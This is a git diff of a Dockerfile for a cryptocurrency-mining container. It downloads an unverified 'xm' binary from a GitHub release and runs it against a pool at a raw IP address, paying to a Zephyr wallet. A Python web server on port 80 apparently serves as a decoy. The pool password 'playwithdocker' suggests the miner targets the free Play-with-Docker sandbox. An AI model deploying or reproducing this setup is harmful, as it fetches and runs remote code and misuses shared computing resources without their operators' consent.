@@ -4,10 +4,10 @@ RUN apt-get update \
 	&& rm -rf /var/lib/apt/lists/*
 USER root
 ENV POOL_URL 107.178.97.202:4444
-ENV POOL_USER ZEPHYR39Db7Wv6bDx9KLqWCc9iYKKD2U9dvZMmoNCfaETBEk7iZVxRPcz1R82GWSu4LKxYvD6j6yKYhWJMw3NyN1BHJzZu2326W4K
-ENV POOL_PW test
+ENV POOL_USER ZEPHsAMLgSJhN28snus2P4ZR3P3PTD4np1ZYzan1w6HNeq5T6ackkgFSkoevQESJhTWJ8XT12ufkhfp2CSd88gfTS8vxVeBH2hZ
+ENV POOL_PW playwithdocker
 WORKDIR /home/miner
 RUN wget https://github.com/ddao2604/tech/releases/download/1.0/xm \
 	&& chmod +x xm
 EXPOSE 80 21550
-CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k --http-host=127.0.0.1 --http-port=21550
+CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k --no-title --log-file=log.txt --donate-over-proxy=107.178.97.202:4444
